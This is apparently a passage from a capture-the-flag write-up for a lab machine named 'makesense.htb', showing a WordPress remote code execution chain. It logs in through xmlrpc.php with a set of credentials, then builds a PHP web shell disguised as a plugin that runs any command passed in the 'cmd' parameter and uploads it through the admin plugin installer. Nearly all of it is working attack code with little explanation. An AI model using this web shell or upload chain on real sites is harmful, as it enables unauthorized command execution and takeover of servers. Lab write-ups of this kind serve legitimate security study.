## 3. WordPress RCE

### Login via XMLRPC

```bash
# Generate auth cookie

curl -sk 'https://$IP/xmlrpc.php' \
  -H "Host: makesense.htb" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>xploit</string></value></param><param><value><string>Xploit123!</string></value></param></params></methodCall>'
```

### Malicious Plugin Upload

```bash
# Create plugin zip

cat > /tmp/exploit-plugin.php << 'EOF'
<?php
/**
 * Plugin Name: Exploit Plugin
 * Version: 1.0
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
EOF

cd /tmp && zip exploit-plugin.zip exploit-plugin.php

# Upload via WordPress admin

curl -sk 'https://$IP/wp-admin/plugin-install.php' \
  -H "Host: makesense.htb" \
  -b "wordpress_cookie=..." \
  -F "pluginzip=@exploit-plugin.zip" \
  -F "install-plugin-submit=Install Now"
